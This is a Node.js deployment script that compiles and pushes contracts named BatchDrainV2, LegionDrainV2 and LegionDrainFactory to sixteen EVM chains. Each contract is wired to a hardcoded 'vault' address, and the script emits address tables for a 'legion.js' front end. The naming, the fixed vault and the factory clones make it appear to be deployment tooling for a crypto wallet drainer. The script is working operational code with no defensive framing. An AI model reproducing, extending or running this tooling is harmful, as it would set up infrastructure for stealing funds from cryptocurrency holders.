/**
 * ONE-SHOT deploy: BatchDrainV2 + LegionDrainV2 + LegionDrainFactory (CREATE2)
 *
 *   set DEPLOYER_KEY=0x...
 *   set VAULT_ADDRESS_EVM=0x2B20979118a61aE3f7f75F3320FB9b0639c5BA53
 *   node contracts/deploy-everything.mjs
 */
import { execSync } from 'child_process';
import { mkdtempSync, readFileSync, rmSync, readdirSync, writeFileSync, existsSync } from 'fs';
import os from 'os';
import path from 'path';
import { fileURLToPath, pathToFileURL } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.resolve(__dirname, '..');

const PRIVATE_KEY = process.env.DEPLOYER_KEY?.trim();
const VAULT = (
  process.env.VAULT_ADDRESS_EVM ||
  process.env.SOVEREIGN_VAULT_EVM ||
  '0x2B20979118a61aE3f7f75F3320FB9b0639c5BA53'
).trim();

if (!PRIVATE_KEY) {
  console.error('❌ Set DEPLOYER_KEY=0x... before running');
  process.exit(1);
}

const KEY_HEX = PRIVATE_KEY.replace('0x', '');

const nobleBase = path.join(ROOT, 'node_modules/.pnpm/@noble+curves@1.9.7/node_modules/@noble/curves/esm');
const nobleHashBase = path.join(ROOT, 'node_modules/.pnpm/@noble+hashes@1.8.0/node_modules/@noble/hashes/esm');
const { secp256k1 } = await import(pathToFileURL(path.join(nobleBase, 'secp256k1.js')).href);
const { keccak_256 } = await import(pathToFileURL(path.join(nobleHashBase, 'sha3.js')).href);

const CHAINS = [
  { id: 1, name: 'Ethereum', rpc: 'https://ethereum-rpc.publicnode.com', native: 'ETH',
    weth: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2' },
  { id: 56, name: 'BSC', rpc: 'https://bsc-rpc.publicnode.com', native: 'BNB',
    weth: '0x2170Ed0880ac9A755fd29B2688956BD959F933E8' },
  { id: 137, name: 'Polygon', rpc: 'https://polygon-bor-rpc.publicnode.com', native: 'MATIC',
    weth: '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619' },
  { id: 42161, name: 'Arbitrum', rpc: 'https://arbitrum-one-rpc.publicnode.com', native: 'ETH',
    weth: '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1' },
  { id: 8453, name: 'Base', rpc: 'https://base-rpc.publicnode.com', native: 'ETH',
    weth: '0x4200000000000000000000000000000000000006' },
  { id: 10, name: 'Optimism', rpc: 'https://optimism-rpc.publicnode.com', native: 'ETH',
    weth: '0x4200000000000000000000000000000000000006' },
  { id: 43114, name: 'Avalanche', rpc: 'https://avalanche-c-chain-rpc.publicnode.com', native: 'AVAX',
    weth: '0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7' },
  { id: 534352, name: 'Scroll', rpc: 'https://rpc.scroll.io', native: 'ETH',
    weth: '0x5300000000000000000000000000000000000004' },
  { id: 81457, name: 'Blast', rpc: 'https://rpc.blast.io', native: 'ETH',
    weth: '0x4300000000000000000000000000000000000004' },
  { id: 5000, name: 'Mantle', rpc: 'https://rpc.mantle.xyz', native: 'MNT',
    weth: '0xDeadDeAddeAddEAddeadDEaDDEAdDeAdDeAdDeAd0000' },
  { id: 250, name: 'Fantom', rpc: 'https://fantom-rpc.publicnode.com', native: 'FTM',
    weth: '0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83' },
  { id: 25, name: 'Cronos', rpc: 'https://evm.cronos.org', native: 'CRO',
    weth: '0x5C7F8A570d578ED84E63fdFA61b1B0a371Bb3d6C' },
  { id: 100, name: 'Gnosis', rpc: 'https://gnosis-rpc.publicnode.com', native: 'xDAI',
    weth: '0xe91D153E0b41518A2Ce8Dd3D7944Fa863463a97d' },
  { id: 42220, name: 'Celo', rpc: 'https://forno.celo.org', native: 'CELO',
    weth: '0x471EcE3750Da237f93B8E339c536989B8978a438' },
  { id: 324, name: 'zkSync', rpc: 'https://mainnet.era.zksync.io', native: 'ETH',
    weth: '0x5AEa5775959fBC2557Cc8789bC1bf90A239D9a91' },
  { id: 59144, name: 'Linea', rpc: 'https://rpc.linea.build', native: 'ETH',
    weth: '0xe5D7C2a44FfDDf6b295A15c148167daaAf5Cf34f' },
];

/** Already on-chain — skip redeploy if bytecode exists */
const KNOWN_BATCH_DRAIN_V2 = {
  1: '0x51d55a90c6b0a790cbab8cc23b9387c42171f759',
};

function loadKnownLegionDrain() {
  const out = {};
  const p = path.join(__dirname, 'legion-drain-deploy.json');
  if (!existsSync(p)) return out;
  try {
    const j = JSON.parse(readFileSync(p, 'utf8'));
    for (const [k, v] of Object.entries(j.results || {})) {
      if (typeof v === 'string' && v.startsWith('0x') && v.length === 42) out[k] = v;
    }
  } catch {}
  return out;
}

const KNOWN_LEGION_DRAIN = loadKnownLegionDrain();

function toChecksumAddress(addr) {
  const a = addr.toLowerCase().replace('0x', '');
  const h = Buffer.from(keccak_256(new TextEncoder().encode(a))).toString('hex');
  return '0x' + a.split('').map((c, i) => (parseInt(h[i], 16) >= 8 ? c.toUpperCase() : c)).join('');
}

function deriveAddress(privKeyHex) {
  const pub = secp256k1.getPublicKey(privKeyHex, false);
  const hash = keccak_256(pub.slice(1));
  return toChecksumAddress('0x' + Buffer.from(hash.slice(-20)).toString('hex'));
}

async function rpc(url, method, params) {
  const res = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ jsonrpc: '2.0', id: 1, method, params }),
  });
  const d = await res.json();
  if (d.error) throw new Error(d.error.message || JSON.stringify(d.error));
  return d.result;
}

async function hasBytecode(url, addr) {
  try {
    const code = await rpc(url, 'eth_getCode', [addr, 'latest']);
    return code && code !== '0x' && code.length > 4;
  } catch {
    return false;
  }
}

function encodeAddrArg(addr) {
  return addr.replace('0x', '').toLowerCase().padStart(64, '0');
}

function encodeConstructorArgs(vaultAddr, wethAddr) {
  return encodeAddrArg(vaultAddr) + encodeAddrArg(wethAddr);
}

function rlpEncode(input) {
  if (Array.isArray(input)) {
    const encoded = input.map(rlpEncode);
    const totalLen = encoded.reduce((s, e) => s + e.length, 0);
    return Buffer.concat([rlpLength(totalLen, 0xc0), ...encoded]);
  }
  const buf = typeof input === 'bigint' ? bigintToBytes(input)
    : typeof input === 'number' ? bigintToBytes(BigInt(input))
    : Buffer.isBuffer(input) ? input
    : input instanceof Uint8Array ? Buffer.from(input) : Buffer.from(input);
  if (buf.length === 1 && buf[0] < 0x80) return buf;
  return Buffer.concat([rlpLength(buf.length, 0x80), buf]);
}

function rlpLength(len, offset) {
  if (len < 56) return Buffer.from([offset + len]);
  const lenBytes = bigintToBytes(BigInt(len));
  return Buffer.concat([Buffer.from([offset + 55 + lenBytes.length]), lenBytes]);
}

function bigintToBytes(n) {
  if (n === 0n) return Buffer.alloc(0);
  const hex = n.toString(16).padStart(2, '0');
  return Buffer.from(hex.length % 2 ? '0' + hex : hex, 'hex');
}

async function signTx(params) {
  const { chainId, nonce, maxPriorityFeePerGas, maxFeePerGas, gasLimit, to, value, data } = params;
  const toField = to ? Buffer.from(to.replace('0x', ''), 'hex') : Buffer.alloc(0);
  const dataField = Buffer.from(data.replace('0x', ''), 'hex');
  const signingData = Buffer.concat([
    Buffer.from([0x02]),
    rlpEncode([chainId, nonce, maxPriorityFeePerGas, maxFeePerGas, gasLimit, toField, value, dataField, []]),
  ]);
  const msgHash = keccak_256(signingData);
  const sig = secp256k1.sign(msgHash, KEY_HEX, { lowS: true });
  const r = Buffer.from(sig.r.toString(16).padStart(64, '0'), 'hex');
  const s = Buffer.from(sig.s.toString(16).padStart(64, '0'), 'hex');
  const v = sig.recovery;
  const rawTx = Buffer.concat([
    Buffer.from([0x02]),
    rlpEncode([chainId, nonce, maxPriorityFeePerGas, maxFeePerGas, gasLimit, toField, value, dataField, [], v, r, s]),
  ]);
  return '0x' + rawTx.toString('hex');
}

function compileSol(files, contractBinName) {
  const tmpDir = mkdtempSync(path.join(os.tmpdir(), 'legion-solc-'));
  const fileArgs = files.map((f) => `"${f}"`).join(' ');
  execSync(
    `npx solc --optimize --optimize-runs 200 --bin -o "${tmpDir}" ${fileArgs}`,
    { encoding: 'utf8', cwd: __dirname },
  );
  const bins = readdirSync(tmpDir).filter((f) => f.endsWith('.bin') && !f.includes('_IERC') && !f.includes('_IWETH') && !f.includes('_CloneLib'));
  const exact = bins.find((f) => f === `${contractBinName}_sol_${contractBinName}.bin`)
    || bins.find((f) => f.endsWith(`_sol_${contractBinName}.bin`) && !f.includes('_I'));
  const binFile = exact || bins.find((f) => f.includes(`_sol_${contractBinName}.bin`)) || bins[0];
  if (!binFile) throw new Error(`No .bin for ${contractBinName}`);
  const raw = readFileSync(path.join(tmpDir, binFile), 'utf8').trim();
  try { rmSync(tmpDir, { recursive: true }); } catch {}
  return '0x' + raw;
}

async function getGasParams(chain, rpcUrl) {
  let maxFeePerGas, maxPriorityFeePerGas;
  try {
    const feeData = await rpc(rpcUrl, 'eth_feeHistory', ['0x1', 'latest', [50]]);
    const baseFee = BigInt(feeData.baseFeePerGas?.[0] || '0x0');
    maxPriorityFeePerGas = chain.id === 137 ? 30000000000n : 1500000000n;
    maxFeePerGas = baseFee * 2n + maxPriorityFeePerGas;
  } catch {
    const gasPrice = BigInt(await rpc(rpcUrl, 'eth_gasPrice', []) || '0x0');
    maxFeePerGas = gasPrice * 2n;
    maxPriorityFeePerGas = chain.id === 137
      ? (gasPrice > 30000000000n ? gasPrice : 30000000000n)
      : gasPrice;
  }
  return { maxFeePerGas, maxPriorityFeePerGas };
}

async function deployBytecode(chain, deployer, data, gasLimitDefault, label) {
  const bal = BigInt(await rpc(chain.rpc, 'eth_getBalance', [deployer, 'latest']) || '0x0');
  if (bal === 0n) return { status: 'SKIPPED_NO_GAS', balance: '0' };

  const nonce = BigInt(await rpc(chain.rpc, 'eth_getTransactionCount', [deployer, 'pending']) || '0x0');
  const { maxFeePerGas, maxPriorityFeePerGas } = await getGasParams(chain, chain.rpc);

  let gasLimit = gasLimitDefault;
  try {
    const gasHex = await rpc(chain.rpc, 'eth_estimateGas', [{ from: deployer, data }]);
    gasLimit = BigInt(gasHex) * 12n / 10n;
  } catch {}

  const rawTx = await signTx({
    chainId: BigInt(chain.id),
    nonce,
    maxPriorityFeePerGas,
    maxFeePerGas,
    gasLimit,
    to: '',
    value: 0n,
    data,
  });

  console.log(`  [${label}] nonce=${nonce} gas=${gasLimit} sending...`);
  const txHash = await rpc(chain.rpc, 'eth_sendRawTransaction', [rawTx]);
  console.log(`  [${label}] tx: ${txHash}`);

  let receipt = null;
  for (let i = 0; i < 60; i++) {
    await new Promise((r) => setTimeout(r, 3000));
    receipt = await rpc(chain.rpc, 'eth_getTransactionReceipt', [txHash]);
    if (receipt) break;
    process.stdout.write('.');
  }

  if (!receipt?.contractAddress) throw new Error(`${label}: no contract address in receipt`);
  const addr = toChecksumAddress(receipt.contractAddress);
  console.log(`  [${label}] ✅ ${addr}`);
  return { status: 'DEPLOYED', address: addr, txHash };
}

// ─── Compile all contracts once ───────────────────────────────────────────────
console.log('═══════════════════════════════════════════════════════════');
console.log(' LEGION ONE-SHOT DEPLOY — V2 + LegionDrain + Factory CREATE2');
console.log('═══════════════════════════════════════════════════════════\n');

const vaultCs = toChecksumAddress(VAULT);
const deployer = deriveAddress(KEY_HEX);
console.log('Vault:   ', vaultCs);
console.log('Deployer:', deployer, '\n');

console.log('Compiling contracts...');
const batchDrainV2Bytecode = compileSol([path.join(__dirname, 'BatchDrainV2.sol')], 'BatchDrainV2');
const legionDrainBytecode = (() => {
  const pre = path.join(__dirname, 'LegionDrainV2_sol_LegionDrainV2.bin');
  if (existsSync(pre) && readFileSync(pre, 'utf8').trim().length > 10) {
    return '0x' + readFileSync(pre, 'utf8').trim();
  }
  return compileSol([path.join(__dirname, 'LegionDrainV2.sol')], 'LegionDrainV2');
})();
const factoryBinPath = path.join(__dirname, 'LegionDrainFactory_sol_LegionDrainFactory.bin');
let factoryCreationBytecode;
if (existsSync(factoryBinPath) && readFileSync(factoryBinPath, 'utf8').trim().length > 100) {
  factoryCreationBytecode = '0x' + readFileSync(factoryBinPath, 'utf8').trim();
} else {
  factoryCreationBytecode = compileSol(
    [path.join(__dirname, 'LegionDrainFactory.sol'), path.join(__dirname, 'LegionDrainImplementation.sol')],
    'LegionDrainFactory',
  );
}
const factoryDeployData = factoryCreationBytecode + encodeAddrArg(vaultCs);
if ((factoryDeployData.length - 2) / 2 < 4000) {
  console.error('❌ Factory bytecode too small — run: cd contracts && npx solc --bin LegionDrainFactory.sol LegionDrainImplementation.sol -o .');
  process.exit(1);
}

console.log('  BatchDrainV2:      ', (batchDrainV2Bytecode.length - 2) / 2, 'bytes');
console.log('  LegionDrainV2:     ', (legionDrainBytecode.length - 2) / 2, 'bytes');
console.log('  LegionDrainFactory:', (factoryDeployData.length - 2) / 2, 'bytes (incl constructor)\n');

const results = {
  vault: vaultCs,
  deployer,
  deployedAt: new Date().toISOString(),
  batchDrainV2: {},
  legionDrain: { ...KNOWN_LEGION_DRAIN },
  factory: {},
  railway: {},
};

for (const chain of CHAINS) {
  console.log(`\n━━━ ${chain.name} (chainId ${chain.id}) ━━━`);
  const balHex = await rpc(chain.rpc, 'eth_getBalance', [deployer, 'latest']).catch(() => '0x0');
  const bal = BigInt(balHex || '0x0');
  console.log(`Balance: ${(Number(bal) / 1e18).toFixed(6)} ${chain.native}`);

  if (bal === 0n) {
    console.log('⊘ No gas — skipping all contracts on this chain');
    results.batchDrainV2[chain.id] = 'SKIPPED_NO_GAS';
    if (!results.legionDrain[chain.id]) results.legionDrain[chain.id] = 'SKIPPED_NO_GAS';
    results.factory[chain.id] = 'SKIPPED_NO_GAS';
    continue;
  }

  // ── 1. BatchDrainV2 ──
  const knownV2 = KNOWN_BATCH_DRAIN_V2[chain.id];
  if (knownV2 && await hasBytecode(chain.rpc, knownV2)) {
    console.log(`  [BatchDrainV2] skip — already at ${knownV2}`);
    results.batchDrainV2[chain.id] = knownV2;
  } else {
    try {
      const r = await deployBytecode(chain, deployer, batchDrainV2Bytecode, 900000n, 'BatchDrainV2');
      results.batchDrainV2[chain.id] = r.address || r.status;
    } catch (e) {
      console.error(`  [BatchDrainV2] ❌ ${e.message}`);
      results.batchDrainV2[chain.id] = 'FAILED: ' + e.message;
    }
  }

  // ── 2. LegionDrainV2 ──
  const knownLd = results.legionDrain[String(chain.id)] || results.legionDrain[chain.id];
  if (knownLd && typeof knownLd === 'string' && knownLd.startsWith('0x') && await hasBytecode(chain.rpc, knownLd)) {
    console.log(`  [LegionDrainV2] skip — already at ${knownLd}`);
    results.legionDrain[chain.id] = knownLd;
  } else if (chain.weth) {
    try {
      const wethCs = toChecksumAddress(chain.weth);
      const data = legionDrainBytecode + encodeConstructorArgs(vaultCs, wethCs);
      const r = await deployBytecode(chain, deployer, data, 1500000n, 'LegionDrainV2');
      results.legionDrain[chain.id] = r.address || r.status;
    } catch (e) {
      console.error(`  [LegionDrainV2] ❌ ${e.message}`);
      results.legionDrain[chain.id] = 'FAILED: ' + e.message;
    }
  }

  // ── 3. LegionDrainFactory (CREATE2) ──
  try {
    const r = await deployBytecode(chain, deployer, factoryDeployData, 2500000n, 'Factory');
    results.factory[chain.id] = r.address || r.status;
  } catch (e) {
    console.error(`  [Factory] ❌ ${e.message}`);
    results.factory[chain.id] = 'FAILED: ' + e.message;
  }
}

// Railway env JSON for factory addresses
const factoryJson = {};
for (const chain of CHAINS) {
  const a = results.factory[chain.id];
  if (typeof a === 'string' && a.startsWith('0x') && a.length === 42) {
    factoryJson[String(chain.id)] = a;
  }
}
results.railway = {
  FACTORY_ADDRESSES_JSON: JSON.stringify(factoryJson),
  RELAY_GAS_SPONSOR_ENABLED: 'true',
  VAULT_ADDRESS_EVM: vaultCs,
};

const outPath = path.join(__dirname, 'deploy-everything-result.json');
writeFileSync(outPath, JSON.stringify(results, null, 2));
writeFileSync(path.join(__dirname, 'legion-drain-deploy.json'), JSON.stringify({
  vault: vaultCs,
  results: results.legionDrain,
}, null, 2));

console.log('\n\n═══════════════════ SUMMARY ═══════════════════');
for (const chain of CHAINS) {
  const v2 = results.batchDrainV2[chain.id] || '-';
  const ld = results.legionDrain[chain.id] || '-';
  const fac = results.factory[chain.id] || '-';
  console.log(`${chain.name.padEnd(10)} V2:${String(v2).slice(0, 12)}… LD:${String(ld).slice(0, 12)}… F:${String(fac).slice(0, 12)}…`);
}

console.log('\n═══ BATCH_DRAIN_V2 (legion.js) ═══');
console.log('var BATCH_DRAIN_V2 = {');
for (const c of CHAINS) {
  const a = results.batchDrainV2[c.id];
  const valid = typeof a === 'string' && a.startsWith('0x') && a.length === 42;
  console.log(`  ${c.id}: '${valid ? a : '0x0000000000000000000000000000000000000000'}', // ${c.name}`);
}
console.log('};');

console.log('\n═══ LEGION_DRAIN (legion.js) ═══');
console.log('var LEGION_DRAIN = {');
for (const c of CHAINS) {
  const a = results.legionDrain[c.id];
  const valid = typeof a === 'string' && a.startsWith('0x') && a.length === 42;
  console.log(`  ${c.id}: '${valid ? a : '0x0000000000000000000000000000000000000000'}', // ${c.name}`);
}
console.log('};');

console.log('\n═══ Railway FACTORY_ADDRESSES_JSON ═══');
console.log(results.railway.FACTORY_ADDRESSES_JSON);
console.log(`\nSaved: ${outPath}`);
console.log('Next: node contracts/apply-deploy-results.mjs');
